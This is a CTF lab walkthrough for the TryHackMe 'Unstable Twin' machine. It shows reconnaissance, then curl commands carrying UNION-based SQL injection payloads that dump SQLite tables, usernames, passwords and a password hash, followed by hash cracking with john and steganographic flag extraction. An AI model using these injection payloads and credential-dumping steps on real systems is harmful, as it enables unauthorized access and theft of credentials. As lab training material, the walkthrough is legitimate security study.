---
title: Unstable Twin
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Unstable
  Twin machine on TryHackMe.
slug: unstable-twin
---




```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    nginx 1.14.1

```

```
└─$ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://ut.thm      
/infoinfo                 (Status: 200) 
```

```
curl http://ut.thm/info -v
* Host ut.thm:80 was resolved.
* IPv6: (none)
* IPv4: 10.64.157.161
*   Trying 10.64.157.161:80...
* Connected to ut.thm (10.64.157.161) port 80
* using HTTP/1.x
> GET /info HTTP/1.1
> Host: ut.thm
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.14.1
< Date: Wed, 24 Dec 2025 12:51:29 GMT
< Content-Type: application/json
< Content-Length: 160
< Connection: keep-alive
< Build Number: 1.3.4-dev
< Server Name: Vincent
< 
"The login API needs to be called with the username and password form fields fields.  It has not been fully tested yet so may not be full developed and secure"
* Connection #0 to host ut.thm left intact

```

```
└─$ curl http://ut.thm/info -v
* Host ut.thm:80 was resolved.
* IPv6: (none)
* IPv4: 10.64.157.161
*   Trying 10.64.157.161:80...
* Connected to ut.thm (10.64.157.161) port 80
* using HTTP/1.x
> GET /info HTTP/1.1
> Host: ut.thm
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.14.1
< Date: Wed, 24 Dec 2025 12:52:10 GMT
< Content-Type: application/json
< Content-Length: 148
< Connection: keep-alive
< Build Number: 1.3.6-final
< Server Name: Julias
< 
"The login API needs to be called with the username and password fields.  It has not been fully tested yet so may not be full developed and secure"
* Connection #0 to host ut.thm left intact

```

> Just like twin curl give 2 outputs two servers

```
ffuf -mc all -fs 233 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://ut.thm/FUZZ

info                    [Status: 200, Size: 148, Words: 29, Lines: 2,
api                     [Status: 404, Size: 0, Words: 1, Lines: 1, 

```

```
ffuf -mc all -fs 233 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://ut.thm/api/FUZZ

login                   [Status: 405, Size: 178, Words: 20, Lines: 5, Duration:

```

```
└─$ curl -X POST http://ut.thm/api/login
[]

┌──(kali㉿kali)-[~]
└─$ curl -X POST http://ut.thm/api/login
"The username or password passed are not correct."

```

```
└─$ curl -X POST 'http://ut.thm/api/login' -d "username=admin&password=admin'"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.</p>

```

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST 'http://ut.thm/api/login' -d "username=admin&password=admin'UNION SELECT 1,sqlite_version()--"
"The username or password passed are not correct."

┌──(kali㉿kali)-[~]
└─$ curl -X POST 'http://ut.thm/api/login' -d "username=admin&password=admin'UNION SELECT 1,sqlite_version()--"
[
  [
    1, 
    "3.26.0"
  ]
]

```

```
└─$ curl -X POST 'http://ut.thm/api/login' -d "username=admin&password=admin'UNION SELECT 1,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--"
"The username or password passed are not correct."

┌──(kali㉿kali)-[~]
└─$ curl -X POST 'http://ut.thm/api/login' -d "username=admin&password=admin'UNION SELECT 1,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--"
[
  [
    1, 
    "notes"
  ], 
  [
    1, 
    "users"
  ]
]

```

```
└─$ curl -X POST 'http://ut.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,(select sql from sqlite_master where tbl_name = 'users')--"
 
"The username or password passed are not correct."

┌──(kali㉿kali)-[~]
└─$ curl -X POST 'http://ut.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,(select sql from sqlite_master where tbl_name = 'users')--"

[
  [
    1, 
    "CREATE TABLE \"users\" (\n\t\"id\"\tINTEGER UNIQUE,\n\t\"username\"\tTEXT NOT NULL UNIQUE,\n\t\"password\"\tTEXT NOT NULL UNIQUE,\n\tPRIMARY KEY(\"id\" AUTOINCREMENT)\n)"
  ]
]

```

```
└─$ curl -X POST 'http://ut.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,group_concat(username) from users--"
"The username or password passed are not correct."

┌──(kali㉿kali)-[~]
└─$ curl -X POST 'http://ut.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,group_concat(username) from users--"
[
  [
    1, 
    "julias,linda,marnie,mary_ann,vincent"
  ]
]
  
```

```
└─$ curl -X POST 'http://ut.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,group_concat(password) from users--"
"The username or password passed are not correct."

┌──(kali㉿kali)-[~]
└─$ curl -X POST 'http://ut.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,group_concat(password) from users--"
[
  [
    1, 
    "Green,Orange,Red,Yellow ,continue..."
  ]
]
 
```

```
└─$ curl -X POST 'http://ut.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,(select sql from sqlite_master where tbl_name = 'notes')--"
"The username or password passed are not correct."

┌──(kali㉿kali)-[~]
└─$ curl -X POST 'http://ut.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,(select sql from sqlite_master where tbl_name = 'notes')--"
[
  [
    1, 
    "CREATE TABLE \"notes\" (\n\t\"id\"\tINTEGER UNIQUE,\n\t\"user_id\"\tINTEGER,\n\t\"note_sql\"\tINTEGER,\n\t\"notes\"\tTEXT,\n\tPRIMARY KEY(\"id\")\n)"
  ]
]

```

```
curl -X POST 'http://ut.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,notes FROM notes-- -"
"The username or password passed are not correct."

┌──(kali㉿kali)-[~]
└─$ curl -X POST 'http://ut.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,notes FROM notes-- -"
[
  [
    1, 
    "I have left my notes on the server.  They will me help get the family back together. "
  ], 
  [
    1, 
    "My Password is eaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe25ecaa607c4b7dd99c43b0c01af669c90fd6a14933422cf984324f645b84427343f4\n"
  ]
]

```

```
john hash.txt --format=Raw-SHA512 --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 256/256 AVX2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
experiment       (?)     
1g 0:00:00:01 DONE (2025-12-24 08:09) 0.9259g/s 174459p/s 174459c/s 174459C/s joan21..become
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

```
[mary_ann@UnstableTwin ~]$ ls
server_notes.txt  user.flag
[mary_ann@UnstableTwin ~]$ cat user.flag
.............
[mary_ann@UnstableTwin ~]$ cat server_notes.txt
Now you have found my notes you now you need to put my extended family together.

We need to GET their IMAGE for the family album.  These can be retrieved by NAME.

You need to find all of them and a picture of myself!

```

> in `/opt` directory found something

```
@app.route('/get_image')
def get_image():
    if request.args.get('name').lower() == 'marnie':
        filename = 'Twins-Kelly-Preston.jpg'
        return send_file(filename, mimetype='image/gif')
    elif request.args.get('name').lower() == 'linda':
        filename = 'Twins-Chloe-Webb.jpg'
        return send_file(filename, mimetype='image/gif')
    elif request.args.get('name').lower() == 'mary_ann':
        filename = 'Twins-Bonnie-Bartlett.jpg'
        return send_file(filename, mimetype='image/gif')
    return '', 404


if __name__ == '__main__':
    app.run(port=5000)


```

> and I get all images into my pc

```
└─$ ls -la
total 120
drwxrwxr-x  2 kali kali  4096 Dec 24 08:27 .
drwxrwxr-x 47 kali kali  4096 Dec 24 08:19 ..
-rw-rw-r--  1 kali kali     0 Dec 24 08:19 julias.jpg
-rw-rw-r--  1 kali kali     0 Dec 24 08:26 linda.jpg
-rw-rw-r--  1 kali kali 56755 Dec 24 08:26 marnie.jpg
-rw-rw-r--  1 kali kali     0 Dec 24 08:26 mary_ann.jpg
-rw-rw-r--  1 kali kali 56755 Dec 24 08:27 vincent.jpg

```

> use steghide and see what we can find
> after extract can find some codes so invistigating find that codes belogn base... format after adding all images codes together and using cyberchef decode and get final flag